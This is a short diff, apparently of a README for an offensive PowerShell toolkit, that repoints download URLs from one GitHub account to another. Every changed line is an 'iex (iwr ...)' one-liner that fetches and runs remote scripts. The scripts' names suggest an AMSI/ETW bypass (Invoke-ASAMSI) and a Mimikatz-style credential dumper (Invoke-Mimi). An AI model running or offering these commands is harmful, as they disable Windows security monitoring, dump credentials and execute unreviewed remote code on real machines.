@@ -4,8 +4,8 @@
 
 ```
 
-```iex (iwr -UseBasicParsing https://raw.githubusercontent.com/ASP4RUX/Invoke-AMSI/refs/heads/main/Invoke-ASAMSI.ps1)
+```iex (iwr -UseBasicParsing https://raw.githubusercontent.com/drfalcon23/Invoke-AMSI/refs/heads/main/Invoke-ASAMSI.ps1)
 
 ```Invoke-ASAMSI -etw -v
 
-```iex (iwr -UseBasicParsing https://raw.githubusercontent.com/ASP4RUX/Invoke-AMSI/refs/heads/main/Invoke-Mimi.ps1)
+```iex (iwr -UseBasicParsing https://raw.githubusercontent.com/drfalcon23/Invoke-AMSI/refs/heads/main/Invoke-Mimi.ps1)
